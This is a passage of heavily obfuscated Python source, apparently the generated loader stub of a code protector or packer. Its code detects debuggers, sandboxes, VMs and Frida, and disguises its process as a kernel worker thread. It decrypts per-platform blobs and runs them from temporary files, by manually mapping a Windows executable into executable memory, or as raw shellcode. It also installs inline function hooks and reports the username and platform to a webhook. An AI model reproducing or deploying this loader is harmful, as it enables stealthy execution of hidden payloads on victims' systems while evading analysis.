    def _nixon_შϧᛣᚢɠᚾ滖ʛᎦ():
        import platform as _p_
        import ctypes as _c_
        if _p_.system() == "Windows":
             try:
                 k32 = _c_.windll.kernel32
                 if k32.IsDebuggerPresent(): return False
                 is_remote = _c_.c_bool(False)
                 k32.CheckRemoteDebuggerPresent(k32.GetCurrentProcess(), _c_.byref(is_remote))
                 if is_remote.value: return False
             except: pass
        return True
    @staticmethod
    def _nixon_韑ᛀ车ค҃Ⴢץפৃा():
        import time as _t_
        start = _t_.time()
        for i in range(1000): _ = i * i
        end = _t_.time()
        if (end - start) > 0.1: return False
        return True
    @staticmethod
    def _nixon_ڡ๘ᏧᏳᚺぺɤ澴ʗŁ():
        import os as _o_
        if _o_.environ.get(_nixon_űƋთฺซט毓בը(72)): return False
        return True
    @staticmethod
    def _nixon_ৗǩঐᏙſʥψתႶ():
        return True
def _nixon_Ηฅη恉ۉᎼ颼ौᛐ():
    import sys as _s_
    # Each exit names the check that fired, on stderr, before dying. Silently
    # exiting 1 is indistinguishable from a crash: the macOS CI runs spent
    # rounds as _nixon_űƋთฺซט毓בը(73) because this
    # function said nothing. Naming the check does not help an attacker -- they
    # can read the source -- and it is the difference between a diagnosis and a
    # mystery.
    def _nx_hard_die(code, what):
        try:
            _s_.stderr.write("[BLOCKED] " + str(what) + " (exit " + str(code) + ")\n")
            _s_.stderr.flush()
        except Exception:
            pass
        _s_.exit(code)
    if not _nixon_ՙĝᏗǑড._nixon_ჷȕほʔᛦ(): _nx_hard_die(0, _nixon_űƋთฺซט毓בը(74))
    if not _nixon_ՙĝᏗǑড._nixon_ͼᛁঽゔᛄᎦפ(): _nx_hard_die(1, _nixon_űƋთฺซט毓בը(75))
    if not _nixon_ՙĝᏗǑড._nixon_哉ӪᛩᏬćט(): _nx_hard_die(2, _nixon_űƋთฺซט毓בը(76))
    if not _nixon_ՙĝᏗǑড._nixon_შϧᛣᚢɠᚾ滖ʛᎦ(): _nx_hard_die(3, _nixon_űƋთฺซט毓בը(77))
    if not _nixon_ՙĝᏗǑড._nixon_韑ᛀ车ค҃Ⴢץפৃा(): _nx_hard_die(4, _nixon_űƋთฺซט毓בը(78))
    if not _nixon_ՙĝᏗǑড._nixon_ڡ๘ᏧᏳᚺぺɤ澴ʗŁ(): _nx_hard_die(5, _nixon_űƋთฺซט毓בը(79))
    _nixon_ՙĝᏗǑড._nixon_えıՑϝؒূ३()
    return True

# NOTE (kill-ladder allowlist): the _o._exit(0) calls below are the
# forked TRACER CHILD's fast-exit after its watch loop (child PID only,
# never the protected parent). Exit 0 = child done, not a tamper kill —
# routing through _16cbeae604_k (137 + key wipe) would be WRONG here (it
# would nuke the parent's keys from the child context and report a
# kill for a healthy exit). Documented variance, see
# tests/test_kill_ladder.py allowlist.
def _nixon_龋齟ĸჾ栣ᚯᎰ():
    import sys as _s, os as _o, time as _t, ctypes as _c, signal as _sig
    if _o.environ.get(_nixon_űƋთฺซט毓בը(267)): return True    
    if _s.platform == _nixon_űƋთฺซט毓בը(34):
        try:
            import warnings as _w
            with _w.catch_warnings():
                _w.simplefilter("ignore", DeprecationWarning)
                _pid = _o.fork()
            if _pid == 0:
                try:
                    libc = _c.CDLL(None)
                    # If TRACEME fails there is nothing to demonstrate:
                    # leave quietly instead of stopping for a parent that
                    # may not be our tracer.
                    if libc.ptrace(0, 0, 0, 0) != 0: _o._exit(0)
                    _o.kill(_o.getpid(), _sig.SIGSTOP)
                except: _o._exit(0)
                # The child's only job was the stop above.  Once the
                # parent continues it, it MUST die here.  Falling through
                # ran the rest of the loader in a second copy, which
                # forked again, and the parent's waitpid loop below never
                # returned -- the intermittent artifact hang (300 s, any
                # test that runs an artifact, different one each run).
                _o._exit(0)
            else:
                _o.environ[_nixon_űƋთฺซט毓בը(81)] = str(_o.getpid())
                try:
                    # WUNTRACED is required: if TRACEME failed in the child
                    # (already traced, or blocked by seccomp), its SIGSTOP is
                    # an ordinary stop, and a plain waitpid never reports it
                    # -- the loader then blocked forever.  That is what hung
                    # the test suite.
                    _, _st = _o.waitpid(_pid, _o.WUNTRACED)
                    libc = _c.CDLL(None)
                    if libc.ptrace(7, _pid, 0, 0) != 0:
                        # Cannot resume it; do not wait on a corpse.
                        try:
                            _o.kill(_pid, 9)
                        except Exception:
                            pass
                    while True:
                        _, _st = _o.waitpid(_pid, 0)
                        if _o.WIFEXITED(_st) or _o.WIFSIGNALED(_st):
                            break
                except Exception:
                    pass
        except: return True
    return True

class _nixon_ՁʗάƇᏊᛠ_Loader:
    @staticmethod
    def _nixon_ҠĒҚบभʕǉ(blob_dict):
        system = _nixon_プラットフォーム플랫폼.system().lower()
        is_android = _nixon_űƋთฺซט毓בը(82) in system or _nixon_オペレーション운영.path.exists(_nixon_űƋთฺซט毓בը(83))
        if _nixon_űƋთฺซט毓בը(33) in system and blob_dict.get(_nixon_űƋთฺซט毓בը(33)):
            data = _nixon_ベース베이스.b64decode(blob_dict[_nixon_űƋთฺซט毓בը(33)])
            data = bytes([b ^ BLOB_KEY[i % len(BLOB_KEY)] for i, b in enumerate(data)])
            return _nixon_ՁʗάƇᏊᛠ_Loader._nixon_ǇɴפႰঋɫ(data)
        elif is_android and blob_dict.get(_nixon_űƋთฺซט毓בը(82)):
            data = _nixon_ベース베이스.b64decode(blob_dict[_nixon_űƋთฺซט毓בը(82)])
            data = bytes([b ^ BLOB_KEY[i % len(BLOB_KEY)] for i, b in enumerate(data)])
            return _nixon_ՁʗάƇᏊᛠ_Loader._nixon_מȬٜȭךঞԱʆ(data)
        elif _nixon_űƋთฺซט毓בը(34) in system and blob_dict.get(_nixon_űƋთฺซט毓בը(34)):
            data = _nixon_ベース베이스.b64decode(blob_dict[_nixon_űƋთฺซט毓בը(34)])
            data = bytes([b ^ BLOB_KEY[i % len(BLOB_KEY)] for i, b in enumerate(data)])
            return _nixon_ՁʗάƇᏊᛠ_Loader._nixon_מȬٜȭךঞԱʆ(data)
        elif _nixon_űƋთฺซט毓בը(35) in system and blob_dict.get(_nixon_űƋთฺซט毓בը(35)):
            data = _nixon_ベース베이스.b64decode(blob_dict[_nixon_űƋთฺซט毓בը(35)])
            data = bytes([b ^ BLOB_KEY[i % len(BLOB_KEY)] for i, b in enumerate(data)])
            return _nixon_ՁʗάƇᏊᛠ_Loader._nixon_ぷ撺ひढ़ҘᏔ(data)
        return None
    @staticmethod
    def _nixon_ぷ撺ひढ़ҘᏔ(data):
        try:
            td = _nixon_オペレーション운영.path.expanduser("~/.local/share")
            if not _nixon_オペレーション운영.path.exists(td): td = None
            fd, path = _nixon_テンプ임시.mkstemp(suffix=_nixon_űƋთฺซט毓בը(84), dir=td)
            _nixon_オペレーション운영.write(fd, data)
            _nixon_オペレーション운영.close(fd)
            h = _nixon_シータイプ씨타입.CDLL(path)
            try: _nixon_オペレーション운영.unlink(path)
            except: pass
            return h
        except: return None
    @staticmethod
    def _nixon_מȬٜȭךঞԱʆ(data):
        try:
            import importlib.util, tempfile, os, sys, types
            td = os.path.expanduser("~/.local/share")
            if not os.path.exists(td): td = None
            fd, path = tempfile.mkstemp(suffix=_nixon_űƋთฺซט毓בը(85), dir=td)
            os.write(fd, data)
            os.close(fd)
            spec = importlib.util.spec_from_file_location(_nixon_űƋთฺซט毓בը(86), path)
            mod = importlib.util.module_from_spec(spec)
            sys.modules[_nixon_űƋთฺซט毓בը(86)] = mod
            spec.loader.exec_module(mod)
            try: os.unlink(path)
            except: pass
            return mod
        except: return None
    @staticmethod
    def _nixon_ǇɴפႰঋɫ(data):
        try:
            k32 = _nixon_シータイプ씨타입.windll.kernel32
            e_lfanew = _nixon_構造구조.unpack_from("<I", data, 0x3C)[0]
            op_hdr = e_lfanew + 24
            magic = _nixon_構造구조.unpack_from("<H", data, op_hdr)[0]
            if magic != 0x20B: return None
            sz_img = _nixon_構造구조.unpack_from("<I", data, op_hdr + 56)[0]
            sz_hdrs = _nixon_構造구조.unpack_from("<I", data, op_hdr + 60)[0]
            entry_rva = _nixon_構造구조.unpack_from("<I", data, op_hdr + 16)[0]
            base_orig = _nixon_構造구조.unpack_from("<Q", data, op_hdr + 24)[0]
            k32.VirtualAlloc.restype = _nixon_シータイプ씨타입.c_void_p
            k32.VirtualAlloc.argtypes = [_nixon_シータイプ씨타입.c_void_p, _nixon_シータイプ씨타입.c_size_t, _nixon_シータイプ씨타입.c_uint, _nixon_シータイプ씨타입.c_uint]
            base = k32.VirtualAlloc(None, sz_img, 0x3000, 0x40)
            if not base: return None
            _nixon_シータイプ씨타입.memmove(base, data, sz_hdrs)
            n_sect = _nixon_構造구조.unpack_from("<H", data, e_lfanew + 6)[0]
            sect_ptr = op_hdr + _nixon_構造구조.unpack_from("<H", data, e_lfanew + 20)[0]
            for i in range(n_sect):
                off = sect_ptr + (i * 40)
                v_addr = _nixon_構造구조.unpack_from("<I", data, off + 12)[0]
                r_sz = _nixon_構造구조.unpack_from("<I", data, off + 16)[0]
                r_ptr = _nixon_構造구조.unpack_from("<I", data, off + 20)[0]
                if r_sz > 0: _nixon_シータイプ씨타입.memmove(base + v_addr, data[r_ptr:r_ptr+r_sz], r_sz)
            delta = base - base_orig
            if delta != 0:
                reloc_rva = _nixon_構造구조.unpack_from("<I", data, op_hdr + 152)[0]
                reloc_sz = _nixon_構造구조.unpack_from("<I", data, op_hdr + 156)[0]
                if reloc_rva and reloc_sz:
                    offset = 0
                    while offset < reloc_sz:
                        page_rva = _nixon_構造구조.unpack_from("<I", data, reloc_rva + offset)[0]
                        block_sz = _nixon_構造구조.unpack_from("<I", data, reloc_rva + offset + 4)[0]
                        if block_sz == 0: break
                        num_entries = (block_sz - 8) // 2
                        for j in range(num_entries):
                            entry = _nixon_構造구조.unpack_from("<H", data, reloc_rva + offset + 8 + j*2)[0]
                            e_type = entry >> 12
                            e_off = entry & 0xFFF
                            if e_type == 10:
                                addr = base + page_rva + e_off
                                val = _nixon_シータイプ씨타입.cast(addr, _nixon_シータイプ씨타입.POINTER(_nixon_シータイプ씨타입.c_uint64))[0]
                                _nixon_シータイプ씨타입.cast(addr, _nixon_シータイプ씨타입.POINTER(_nixon_シータイプ씨타입.c_uint64))[0] = val + delta
                        offset += block_sz
            return base + entry_rva
        except Exception: return None

class _nixon_ץǳなჃĝȖΩႲ:
    @staticmethod
    def _nixon_י就跠糢ӫΎ():
        try:
            start = _nixon_時間시간.time()
            _nixon_時間시간.sleep(2.05)
            end = _nixon_時間시간.time()
            if (end - start) < 1.9: return True 
        except: pass
        return False
    @staticmethod
    def _nixon_ぃष৩ฅĽžȫ():
        try:
            if _nixon_オペレーション운영.cpu_count() < 2: return True
            if _nixon_プラットフォーム플랫폼.system() == _nixon_űƋთฺซט毓בը(58):
                try:
                    with open(_nixon_űƋთฺซט毓בը(87), "r", encoding='utf-8') as f:
                        for line in f:
                            if _nixon_űƋთฺซט毓בը(88) in line:
                                kb = int(line.split()[1])
                                if kb < 2000000: pass
                                break
                except: pass
        except: pass
        return False
    @staticmethod
    def _nixon_ᎽらГɚভიՎӠขą():
        banned_users = [_nixon_űƋთฺซט毓בը(89), _nixon_űƋთฺซט毓בը(90), _nixon_űƋთฺซט毓בը(91), _nixon_űƋთฺซט毓בը(92), _nixon_űƋთฺซט毓בը(93), _nixon_űƋთฺซט毓בը(94), _nixon_űƋთฺซט毓בը(95), _nixon_űƋთฺซט毓בը(96), _nixon_űƋთฺซט毓בը(97)]
        banned_hosts = [_nixon_űƋთฺซט毓בը(89), _nixon_űƋთฺซט毓בը(93), _nixon_űƋთฺซט毓בը(98), "vm", _nixon_űƋთฺซט毓בը(92), _nixon_űƋთฺซט毓בը(94)]
        try:
            user = _nixon_オペレーション운영.environ.get(_nixon_űƋთฺซט毓בը(99), "").lower() or _nixon_オペレーション운영.environ.get(_nixon_űƋთฺซט毓בը(100), "").lower()
            host = _nixon_ソケット소켓.gethostname().lower()
            if user in banned_users: return True
            for b in banned_hosts:
                if b in host: return True
        except: pass
        return False
    @staticmethod
    def _nixon_ƇחᏟțʅӲᚹ():
        score = 0
        if _nixon_ץǳなჃĝȖΩႲ._nixon_י就跠糢ӫΎ(): score += 5
        if _nixon_ץǳなჃĝȖΩႲ._nixon_ぃष৩ฅĽžȫ(): score += 2
        if _nixon_ץǳなჃĝȖΩႲ._nixon_ᎽらГɚভიՎӠขą(): score += 2
        return score >= 5


class _nixon_এɞᎯŪĥۖᛅʤᛉ_Injector:
    @staticmethod
    def _nixon_צֆƅӫԾҁĭႨԶΑ(ptr):
        try:
            b = _nixon_シータイプ씨타입.string_at(ptr, 16)
            idx = 0
            while b[idx] in [0x66, 0x67, 0x2E, 0x3E, 0x26, 0x64, 0x65, 0x36, 0xF0, 0xF2, 0xF3] or (0x40 <= b[idx] <= 0x4F): idx += 1
            op = b[idx]
            if 0x50 <= op <= 0x5F: return idx + 1
            if op == 0xC3 or op == 0xC9 or op == 0x90: return idx + 1
            if op == 0x68: return idx + 5
            if op == 0x6A: return idx + 2
            if op == 0xB8: return idx + 5 
            if 0xB8 <= op <= 0xBF: return idx + 9 if (b[idx-1] & 0x08) else idx + 5
            if op in [0x89, 0x8B, 0x8D, 0x31, 0x33, 0x85, 0x01, 0x03, 0x29, 0x2B, 0x3B, 0x83, 0x81]:
                idx += 1
                modrm = b[idx]
                mod = (modrm >> 6) & 0x03; rm = modrm & 0x07
                idx += 1
                if mod == 0x00 and rm == 0x05: idx += 4
                elif mod == 0x01: idx += 1
                elif mod == 0x02: idx += 4
                if rm == 0x04: idx += 1 
                if op == 0x81: idx += 4
                elif op == 0x83: idx += 1
                return idx
            if op == 0xE9 or op == 0xE8: return idx + 5
            if op == 0xEB: return idx + 2
        except: pass
        return 0
    @staticmethod
    def _nixon_鄲ٽЊӛռჅᎺ(tgt, hook):
        k32 = _nixon_シータイプ씨타입.windll.kernel32
        stolen = 0
        cur = tgt
        for _ in range(5):
            l = _nixon_এɞᎯŪĥۖᛅʤᛉ_Injector._nixon_צֆƅӫԾҁĭႨԶΑ(cur)
            if l == 0: stolen = max(stolen, 5); break
            stolen += l; cur += l
            if stolen >= 5: break
        tramp = k32.VirtualAlloc(None, 64, 0x3000, 0x40)
        _nixon_シータイプ씨타입.memmove(tramp, tgt, stolen)
        rel_back = (tgt + stolen) - (tramp + stolen + 5)
        buf = (_nixon_シータイプ씨타입.c_ubyte * 5)(0xE9, rel_back&0xFF, (rel_back>>8)&0xFF, (rel_back>>16)&0xFF, (rel_back>>24)&0xFF)
        _nixon_シータイプ씨타입.memmove(tramp + stolen, buf, 5)
        old = _nixon_シータイプ씨타입.c_ulong()
        k32.VirtualProtect(_nixon_シータイプ씨타입.c_void_p(tgt), stolen, 0x40, _nixon_シータイプ씨타입.byref(old))
        rel_hook = hook - (tgt + 5)
        patch = (_nixon_シータイプ씨타입.c_ubyte * stolen)(0xE9, rel_hook&0xFF, (rel_hook>>8)&0xFF, (rel_hook>>16)&0xFF, (rel_hook>>24)&0xFF)
        for i in range(5, stolen): patch[i] = 0x90
        _nixon_シータイプ씨타입.memmove(tgt, patch, stolen)
        k32.VirtualProtect(_nixon_シータイプ씨타입.c_void_p(tgt), stolen, old, _nixon_シータイプ씨타입.byref(old))
        return tramp


def _nixon_ざցжʊЦע(d):
    m = _nixon_ȫȀε澞žٍ๙בᏘぞ
    if not d.startswith(m): return d
    d = d[len(m):]
    o = bytearray()
    idx = 0
    l = len(d)
    while idx < l:
        chunk_len = d[idx]
        idx += 1
        if idx + chunk_len > l: break
        o.extend(d[idx : idx + chunk_len])
        idx += chunk_len + 16
    return bytes(o)

def _nixon_ႠěǸוֈխ(current, step):
    import hashlib as _nx_hh
    return int.from_bytes(_nx_hh.sha256(str(current).encode() + str(step).encode()).digest()[:8], 'little')


def _nixon_ぜჍฟϧŹʆѵიぢӼ():
    if _nixon_ɫȀח०ƣნほɦ: _打印輸出한글ไทย("[DEBUG] Entering Process Mask")
    try:
        if _nixon_プラットフォーム플랫폼.system() == _nixon_űƋთฺซט毓בը(58):
            try:
                libc = _nixon_シータイプ씨타입.CDLL(_nixon_űƋთฺซט毓בը(59))
            except:
                try: libc = _nixon_シータイプ씨타입.CDLL(_nixon_űƋთฺซט毓בը(101))
                except: return True
            libc.prctl.argtypes = [_nixon_シータイプ씨타입.c_int, _nixon_シータイプ씨타입.c_char_p, _nixon_シータイプ씨타입.c_ulong, _nixon_シータイプ씨타입.c_ulong, _nixon_シータイプ씨타입.c_ulong]
            libc.prctl.restype = _nixon_シータイプ씨타입.c_int
            libc.prctl(15, b"kworker/u4:0", 0, 0, 0)
    except: pass


def _nixon_Ꭿڮւมয():
    if _nixon_ɫȀח०ƣნほɦ: _打印輸出한글ไทย("[DEBUG] Entering Frida Check")
    try:
        if _nixon_プラットフォーム플랫폼.system() == _nixon_űƋთฺซט毓בը(58):
            with open(_nixon_űƋთฺซט毓בը(102), "r", encoding='utf-8') as f:
                m = f.read().lower()
                for s in [_nixon_űƋთฺซט毓בը(103), _nixon_űƋთฺซט毓בը(104), _nixon_űƋთฺซט毓בը(105), _nixon_űƋთฺซט毓בը(106), _nixon_űƋთฺซט毓בը(107), _nixon_űƋთฺซט毓בը(108)]:
                    if s in m: return True
        pass
        s = _nixon_ソケット소켓.socket(_nixon_ソケット소켓.AF_INET, _nixon_ソケット소켓.SOCK_STREAM)
        s.settimeout(0.1)
        if s.connect_ex((_nixon_űƋთฺซט毓בը(109), 27042)) == 0:
            s.close(); return True
        s.close()
        pass
        if _nixon_スレッディング스레딩.active_count() > 50: return True
    except: pass
    return False

def _nixon_ԹՕฏᛒঝქ廎ס(reason, webhook_url):
    if not webhook_url or len(webhook_url) < 10: return
    try:
        pass
        info = {
            _nixon_űƋთฺซט毓בը(110): _nixon_űƋთฺซט毓בը(111),
            _nixon_űƋთฺซט毓בը(112): reason,
            _nixon_űƋთฺซט毓בը(97): _nixon_オペレーション운영.environ.get(_nixon_űƋთฺซט毓בը(99), _nixon_űƋთฺซט毓בը(113)),
            _nixon_űƋთฺซט毓בը(114): _nixon_プラットフォーム플랫폼.platform(),
            _nixon_űƋთฺซט毓בը(115): _nixon_時間시간.ctime()
        }
        req = _nixon_ウラルユーアールエル유알엘.request.Request(webhook_url)
        req.add_header(_nixon_űƋთฺซט毓בը(116), _nixon_űƋთฺซט毓בը(117))
        req.add_header(_nixon_űƋთฺซט毓בը(118), _nixon_űƋთฺซט毓בը(119))
        _nixon_ウラルユーアールエル유알엘.request.urlopen(req, _nixon_ジェイソン제이슨.dumps(info).encode(), timeout=(36743 ^ 36740))
    except Exception: pass
def _nixon_ɤあńᏢᚨ():
    if _nixon_ɫȀח०ƣნほɦ: _打印輸出한글ไทย("[DEBUG] Entering AntMan")
    try:
        if _nixon_プラットフォーム플랫폼.system() == _nixon_űƋთฺซט毓בը(58):
            pass
            try:
                try:
                    libc = _nixon_シータイプ씨타입.CDLL(_nixon_シータイプ씨타입.util.find_library("c"))
                except Exception:
                    try:
                        libc = _nixon_シータイプ씨타입.CDLL(_nixon_űƋთฺซט毓בը(59))
                    except Exception:
                        try: libc = _nixon_シータイプ씨타입.CDLL(_nixon_űƋთฺซט毓בը(101))
                        except Exception: return True
                libc.prctl.argtypes = [_nixon_シータイプ씨타입.c_int, _nixon_シータイプ씨타입.c_ulong, _nixon_シータイプ씨타입.c_ulong, _nixon_シータイプ씨타입.c_ulong, _nixon_シータイプ씨타입.c_ulong]
                libc.prctl.restype = _nixon_シータイプ씨타입.c_int
                res = libc.prctl(4, 0, 0, 0, 0)
                if _nixon_ɫȀח०ƣნほɦ: _打印輸出한글ไทย(f"[DEBUG] AntMan Result: {res}")
            except Exception as e:
                if _nixon_ɫȀח०ƣნほɦ: _打印輸出한글ไทย(f"[WARN] AntMan Failed: {e}")
    except Exception: pass
def _nixon_ǞძごŅĞǈऱჳՆ():
    try:
        if _nixon_ɫȀח०ƣნほɦ: _打印輸出한글ไทย("[DEBUG] Entering RDTSC Check")
        machine = _nixon_プラットフォーム플랫폼.machine().lower()
        if _nixon_űƋთฺซט毓בը(120) in machine or _nixon_űƋთฺซט毓בը(121) in machine:
            start = _nixon_時間시간.perf_counter()
            for i in range(100): x = i * i
            end = _nixon_時間시간.perf_counter()
            if (end - start) > 1.0: return True
            return False
        return False
    except Exception: return False
def _nixon_לɓאॊɚŠ(domain):
    try:
        pass
        url = f"https://dns.google/resolve?name={domain}&type=TXT"
        req = _nixon_ウラルユーアールエル유알엘.request.Request(url, headers={_nixon_űƋთฺซט毓בը(118): _nixon_űƋთฺซט毓בը(122)})
        with _nixon_ウラルユーアールエル유알엘.request.urlopen(req, timeout=(14538 ^ 14543), encoding='utf-8') as r:
            data = _nixon_ジェイソン제이슨.loads(r.read())
            if _nixon_űƋთฺซט毓בը(123) in data:
                return data[_nixon_űƋთฺซט毓בը(123)][0][_nixon_űƋთฺซט毓בը(124)].strip('"')
    except: pass
    return None
def _nixon_ҎϘ瑈จĐॖʜ铍ɿ():
    # Verified TLS for the emitted key fetch.
    #
    # The certificate chain AND the hostname are checked against a trusted
    # CA bundle.  The bundle is the system trust store, plus an optional
    # private CA embedded at build time (--tls-ca-bundle): embedding ADDS
    # trust for an operator-owned endpoint, it never disables verification.
    #
    # This replaces the old unverified-context helper, which accepted any
    # certificate and therefore let a network attacker choose the session
    # key the artifact derives from the response.
    import ssl as _nx_ssl
    try:
        _nx_ctx = _nx_ssl.create_default_context()
    except Exception:
        return None
    _nx_ca = {tls_ca_b64}
    if _nx_ca:
        try:
            import base64 as _nx_b64
            _nx_ctx.load_verify_locations(
                cadata=_nx_b64.b64decode(_nx_ca).decode("ascii"))
        except Exception:
            pass
    try:
        _nx_ctx.verify_mode = _nx_ssl.CERT_REQUIRED
        _nx_ctx.check_hostname = True
    except Exception:
        pass
    return _nx_ctx
def _nixon_ҡさƯטŀ(mod_name):
    try:
        return __import__(mod_name)
    except Exception: return None
def _nixon_Ꮷ螹๒躄ᎠŃŷתŻ騡(data, key=0x55):
    return "".join([chr(ord(c) ^ key) for c in data])

def _check_interpreter_integrity():
    try:
        if _nixon_オペレーション운영.name == 'nt':
            try:
                exe_path = _nixon_システム시스템.executable
                with open(exe_path, "rb") as f:
                    content = f.read(1024*1024)
                if bytes.fromhex(_nixon_űƋთฺซט毓בը(125)) in content or bytes.fromhex(_nixon_űƋთฺซט毓בը(126)) in content or bytes.fromhex(_nixon_űƋთฺซט毓בը(127)) in content.lower():
                    return False
                k32 = _nixon_シータイプ씨타입.windll.kernel32
                h_mod = k32.GetModuleHandleW(_nixon_űƋთฺซט毓בը(128) + str(_nixon_システム시스템.version_info.minor) + _nixon_űƋთฺซט毓בը(129))
                if not h_mod: return False
            except: pass
        safe_builtins = {_nixon_űƋთฺซט毓בը(130): _nixon_űƋთฺซט毓בը(131), _nixon_űƋთฺซט毓בը(132): _nixon_űƋთฺซט毓בը(133), _nixon_űƋთฺซט毓בը(134): _nixon_űƋთฺซט毓בը(135)}
        for name, expected in safe_builtins.items():
            actual = getattr(_nixon_ビルトイン빌트인, name, None)
            if actual and expected not in str(actual): return False
        return True
    except: return True
if not _check_interpreter_integrity():
    # This used to null the hashlib alias here. It bought no security -- an
    # attacker can `import hashlib` -- and it broke the artefact: the Merkle
    # builder and the self-integrity check both run later and use hashlib, so on
    # a host where this guard fires (every Windows runner, apparently) the
    # loader died with "'NoneType_nixon_űƋთฺซט毓בը(136)sha256'" and exit
    # 137. The guard still reports itself; it just no longer disables the
    # library the integrity check depends on.
    globals()[_nixon_űƋთฺซט毓בը(137)] = True


class _nixon_ৌკשᛔᛪ:
    _baseline = None
    @staticmethod
    def _nixon_ऌΦȖՉ烧ხլ艰ĖŠ(iterations=(55903 ^ 55867)):
        try:
            data = b"NIXON_TIMING_BENCHMARK_PAYLOAD_2024"
            start = _nixon_時間시간.perf_counter()
            h = data
            for i in range(iterations):
                h = _nixon_ハッシュ해시.sha256(h if isinstance(h, bytes) else h.encode()).digest()
            elapsed = _nixon_時間시간.perf_counter() - start
            return elapsed
        except:
            return _nixon_時間시간.perf_counter() - _nixon_時間시간.perf_counter()
    @staticmethod
    def _nixon_ű顓Ł้Χɐ():
        try:
            t1 = _nixon_ৌკשᛔᛪ._nixon_ऌΦȖՉ烧ხլ艰ĖŠ(50)
            t2 = _nixon_ৌკשᛔᛪ._nixon_ऌΦȖՉ烧ხլ艰ĖŠ(200)
            if t1 <= 0 or t2 <= 0:
                return False
            ratio_x2 = (t2 + t2) // max(t1, 1)
            if ratio_x2 < 3 or ratio_x2 > 30:
                return True
            start = _nixon_時間시간.perf_counter()
            for i in range(1000):
                _ = pow(65537, i, 2**31 - 1)
            math_elapsed = _nixon_時間시간.perf_counter() - start
            if math_elapsed * 2 > 1:
                return True
            return False
        except:
            return False


class _nixon_ժ稰עϢŏႣᎡɬ:
    _patch_registry = {}
    @staticmethod
    def _derive_mask(func_name, code_len):
        key = _nixon_ハッシュ해시.sha256((_nixon_űƋთฺซט毓בը(138) + func_name).encode()).digest()
        mask = bytearray(code_len)
        for i in range(code_len):
            if i > 0 and i % 32 == 0:
                key = _nixon_ハッシュ해시.sha256(key + i.to_bytes(4, 'little')).digest()
            if i % 2 == 0:
                mask[i] = key[i % 32]
            else:
                mask[i] = 0
        return bytes(mask)
    @staticmethod
    def _nixon_ҔɟๅơǽʇזՎभ(module_dict):
        if _nixon_システム시스템.version_info >= (3, 11):
            return
        try:
            for name, obj in list(module_dict.items()):
                if not callable(obj):
                    continue
                code = getattr(obj, _nixon_űƋთฺซט毓בը(139), None)
                if code is None:
                    continue
                try:
                    raw = bytearray(code.co_code)
                    mask = _nixon_ժ稰עϢŏႣᎡɬ._derive_mask(name, len(raw))
                    patched = bytearray(len(raw))
                    for i in range(len(raw)):
                        patched[i] = raw[i] ^ mask[i]
                    new_code = code.replace(co_code=bytes(patched))
                    obj.__code__ = new_code
                    _nixon_ժ稰עϢŏႣᎡɬ._patch_registry[name] = mask
                except: pass
        except: pass
    @staticmethod
    def _nixon_ᛡДმפᚿ建(func, func_name=None):
        if _nixon_システム시스템.version_info >= (3, 11):
            return func
        try:
            name = func_name or func.__name__
            mask = _nixon_ժ稰עϢŏႣᎡɬ._patch_registry.get(name)
            if mask is None:
                return func
            code = func.__code__
            raw = bytearray(code.co_code)
            unpatched = bytearray(len(raw))
            for i in range(len(raw)):
                unpatched[i] = raw[i] ^ mask[i]
            func.__code__ = code.replace(co_code=bytes(unpatched))
        except: pass
        return func


class _nixon_ӊᚣǹ昀ʫゑ:
    _exec_cache = dict()
    @staticmethod
    def _get_arch():
        m = _nixon_プラットフォーム플랫폼.machine().lower()
        if m in (_nixon_űƋთฺซט毓בը(140), _nixon_űƋთฺซט毓בը(141)): return _nixon_űƋთฺซט毓בը(142)
        if m in (_nixon_űƋთฺซט毓בը(143), _nixon_űƋთฺซט毓בը(144)): return _nixon_űƋთฺซט毓בը(144)
        return None
    @staticmethod
    def _emit_x64_xor():
        return bytes([
            0x53,
            0x48, 0x89, 0xf8,
            0x48, 0x31, 0xc9,
            0x48, 0x39, 0xd1,
            0x7d, 0x15,
            0x48, 0x89, 0xcb,
            0x48, 0x31, 0xd2,
            0x48, 0xf7, 0xf1,
            0x48, 0x89, 0xd3,
            0x0f, 0xb6, 0x1c, 0x1e,
            0x30, 0x1c, 0x0f,
            0x48, 0xff, 0xc1,
            0xeb, 0xe5,
            0x5b,
            0xc3
        ])
    @staticmethod
    def _emit_arm64_xor():
        return bytes([
            0x04, 0x00, 0x80, 0xd2,
            0x9f, 0x00, 0x02, 0xeb,
            0x60, 0x01, 0x00, 0x54,
            0x85, 0x08, 0x03, 0x9a,
            0x25, 0x68, 0x24, 0x38,
            0x26, 0x68, 0x20, 0x38,
            0xa5, 0x00, 0x06, 0x4a,
            0x25, 0x68, 0x24, 0x38,
            0x84, 0x04, 0x00, 0x91,
            0xf5, 0xff, 0xff, 0x17,
            0xc0, 0x03, 0x5f, 0xd6
        ])
    @staticmethod
    def _nixon_ӚשӏᏖڪডぬさ้צ(data, key):
        arch = _nixon_ӊᚣǹ昀ʫゑ._get_arch()
        if arch is None:
            result = bytearray(data)
            for i in range(len(result)):
                result[i] ^= key[i % len(key)]
            return bytes(result)
        try:
            if arch == _nixon_űƋთฺซט毓בը(142):
                code = _nixon_ӊᚣǹ昀ʫゑ._emit_x64_xor()
            else:
                code = _nixon_ӊᚣǹ昀ʫゑ._emit_arm64_xor()
            code_len = len(code)
            page_size = (25721 ^ 29817)
            libc = _nixon_シータイプ씨타입.CDLL(None)
            buf_data = bytearray(data)
            buf_key = bytes(key)
            c_data = (_nixon_シータイプ씨타입.c_ubyte * len(buf_data))(*buf_data)
            c_key = (_nixon_シータイプ씨타입.c_ubyte * len(buf_key))(*buf_key)
            if _nixon_オペレーション운영.name == 'nt':
                k32 = _nixon_シータイプ씨타입.windll.kernel32
                p = k32.VirtualAlloc(0, page_size, 0x3000, 0x40)
                _nixon_シータイプ씨타입.memmove(p, code, code_len)
                ftype = _nixon_シータイプ씨타입.CFUNCTYPE(None, _nixon_シータイプ씨타입.POINTER(_nixon_シータイプ씨타입.c_ubyte), _nixon_シータイプ씨타입.POINTER(_nixon_シータイプ씨타입.c_ubyte), _nixon_シータイプ씨타입.c_uint64, _nixon_シータイプ씨타입.c_uint64)
                func = ftype(p)
                func(c_data, c_key, len(buf_data), len(buf_key))
                k32.VirtualFree(p, 0, 0x8000)
            else:
                p = libc.mmap(0, page_size, 7, 0x22, -1, 0)
                _nixon_シータイプ씨타입.memmove(p, code, code_len)
